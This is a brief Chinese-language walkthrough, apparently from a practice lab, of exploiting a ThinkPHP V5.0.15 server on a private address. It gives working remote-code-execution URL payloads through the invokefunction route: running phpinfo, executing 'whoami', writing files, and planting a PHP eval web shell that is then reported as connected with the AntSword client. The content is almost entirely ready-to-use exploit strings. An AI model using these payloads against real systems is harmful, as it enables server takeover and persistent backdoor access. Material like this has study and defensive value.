# CFS 三层内网

`http://192.168.1.73/public/`

`http://192.168.1.73/public/?s=1` 查看版本为 `ThinkPHP V5.0.15`

测试漏洞, 均成功

- php 代码: phpinfo

  `http://192.168.1.73/public/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100`

- 系统命令: whoami

  `http://192.168.1.73/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

- 写 phpinfo 到文件, http://192.168.1.73/public/shell.php

  `http://192.168.1.73/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php phpinfo();?>`

- 写 shell 到文件, http://192.168.1.73/public/shell1.php

  `http://192.168.1.73/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell1.php&vars[1][]=<?php @eval($_POST[1]);?>`

  蚁剑成功连接
